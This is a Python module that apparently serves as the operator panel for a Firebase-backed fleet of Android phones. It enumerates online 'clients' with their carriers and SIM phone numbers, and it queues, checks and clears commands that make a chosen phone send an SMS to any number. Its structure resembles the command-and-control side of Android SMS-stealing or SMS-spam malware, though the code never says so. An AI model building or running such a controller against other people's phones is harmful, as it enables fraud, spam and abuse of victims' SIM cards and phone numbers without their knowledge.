import logging
from typing import List, Dict, Any, Optional, Tuple

import requests
from requests.adapters import HTTPAdapter

try:
    from urllib3.util.retry import Retry
except Exception:  # pragma: no cover
    Retry = None

logger = logging.getLogger(__name__)


def _build_session() -> requests.Session:
    """A pooled, keep-alive session with retries — much faster than a fresh
    connection (new TLS handshake) on every request."""
    s = requests.Session()
    if Retry is not None:
        retry = Retry(
            total=2,
            backoff_factor=0.3,
            status_forcelist=(500, 502, 503, 504),
            allowed_methods=frozenset(["GET", "PUT", "DELETE"]),
        )
        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=100)
    else:
        adapter = HTTPAdapter(pool_connections=50, pool_maxsize=100)
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s


# One shared session for the whole process (thread-safe for our usage).
_SESSION = _build_session()


class FirebaseManager:
    def __init__(self, base_url: str):
        self.base_url = base_url.strip().rstrip('/')
        if not self.base_url.startswith('http'):
            self.base_url = f"https://{self.base_url}"
        self.session = _SESSION

    def get_url(self, path: str) -> str:
        clean_path = path.lstrip('/')
        return f"{self.base_url}/{clean_path}.json"

    # ---------------------------------------------------------------
    # Connection / counts
    # ---------------------------------------------------------------
    def test_connection(self) -> bool:
        """Lightweight reachability check (shallow query)."""
        try:
            r = self.session.get(f"{self.base_url}/.json?shallow=true", timeout=8)
            return r.status_code == 200
        except Exception as e:
            logger.error(f"Firebase connection error: {e}")
            return False

    def get_client_count(self) -> int:
        """Fast count using shallow query (keys only, no payload)."""
        try:
            r = self.session.get(f"{self.base_url}/clients.json?shallow=true", timeout=10)
            if r.status_code == 200 and r.json():
                return len(r.json())
            return 0
        except Exception:
            return 0

    # ---------------------------------------------------------------
    # Scan — single fetch, parse in one pass (FAST)
    # ---------------------------------------------------------------
    @staticmethod
    def _parse_online(clients: Dict[str, Any]) -> List[Dict[str, Any]]:
        online_devices = []
        for dev_id, data in clients.items():
            if not isinstance(data, dict):
                continue
            status = data.get('status')
            is_online = (status is True or status == 'true' or status == 1 or status == 'online')
            if not is_online:
                continue

            sims = data.get('sims', [])
            sim_slots = []
            if isinstance(sims, list):
                for s in sims:
                    if isinstance(s, dict):
                        sim_slots.append({
                            'slot': s.get('simSlotIndex', '0'),
                            'carrier': s.get('carrierName', 'Unknown'),
                            'phone': s.get('phoneNumber', 'Unknown'),
                        })
            online_devices.append({
                'id': dev_id,
                'model': data.get('modelName', 'Unknown Phone'),
                'battery': data.get('battery', 'N/A'),
                'android_v': data.get('androidV', 'N/A'),
                'provider': data.get('service_provider', 'N/A'),
                'sims': sim_slots,
                'joined': data.get('joined', 'N/A'),
            })
        return online_devices

    def scan(self) -> Tuple[int, List[Dict[str, Any]]]:
        """Fetch /clients ONCE and return (total_clients, online_devices).

        Previously the code downloaded the whole tree twice per scan; this does
        it in a single request which roughly halves scan time and memory."""
        try:
            r = self.session.get(self.get_url('clients'), timeout=30)
            if r.status_code != 200:
                return 0, []
            clients = r.json() or {}
            if not isinstance(clients, dict):
                return 0, []
            return len(clients), self._parse_online(clients)
        except Exception as e:
            logger.error(f"Error scanning clients: {e}")
            return 0, []

    def get_all_clients(self) -> Dict[str, Any]:
        try:
            r = self.session.get(self.get_url('clients'), timeout=30)
            if r.status_code == 200 and r.json():
                return r.json()
            return {}
        except Exception as e:
            logger.error(f"Error fetching clients: {e}")
            return {}

    def get_online_devices(self) -> List[Dict[str, Any]]:
        _, online = self.scan()
        return online

    # ---------------------------------------------------------------
    # SMS command I/O
    # ---------------------------------------------------------------
    def send_sms_command(self, device_id: str, to_number: str, message: str, sim_slot: int = 0) -> bool:
        payload = {
            "from": int(sim_slot),
            "isSended": False,
            "message": message,
            "to": to_number.strip(),
        }
        try:
            url = self.get_url(f"clients/{device_id}/webhookEvent/sendSms")
            r = self.session.put(url, json=payload, timeout=10)
            return r.status_code == 200
        except Exception as e:
            logger.error(f"Error sending SMS command to {device_id}: {e}")
            return False

    def clear_sms_command(self, device_id: str) -> bool:
        try:
            url = self.get_url(f"clients/{device_id}/webhookEvent/sendSms")
            r = self.session.delete(url, timeout=8)
            return r.status_code == 200
        except Exception as e:
            logger.error(f"Error clearing SMS command for {device_id}: {e}")
            return False

    def get_sms_status(self, device_id: str) -> Optional[Dict[str, Any]]:
        try:
            url = self.get_url(f"clients/{device_id}/webhookEvent/sendSms")
            r = self.session.get(url, timeout=8)
            if r.status_code == 200:
                return r.json()
            return None
        except Exception as e:
            logger.error(f"Error reading SMS status for {device_id}: {e}")
            return None
